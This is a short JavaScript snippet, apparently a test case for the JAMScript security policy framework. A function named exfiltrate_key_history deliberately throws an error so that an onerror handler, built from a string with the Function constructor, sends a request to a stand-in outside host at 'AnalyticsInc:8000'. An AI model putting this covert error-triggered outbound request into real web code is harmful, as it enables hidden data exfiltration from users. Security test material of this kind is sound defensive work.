function exfiltrate_key_history() {
  JAMScript.call(window.NotExistingFunction, window, []);
  return
}
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=error1", true);xmlhttp.send(null);';
var v0 = window;
var v2 = JAMScript.call(Function, null, [exp]);
JAMScript.set(v0, "onerror", v2);
var v1 = document.getElementById("test");
JAMScript.set(v1, "onclick", exfiltrate_key_history);

